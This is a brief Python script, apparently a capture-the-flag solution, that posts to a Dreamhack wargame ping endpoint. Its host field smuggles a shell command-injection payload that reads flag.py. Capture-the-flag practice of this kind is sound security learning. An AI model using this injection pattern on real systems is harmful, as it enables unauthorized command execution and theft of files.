





import requests



DATA = {
    "host":"1.1.1.1\";cat flag.py #"
}

HOST = "http://host3.dreamhack.games:17324/ping"

r = requests.post(url=HOST, data=DATA)

print(r.text)



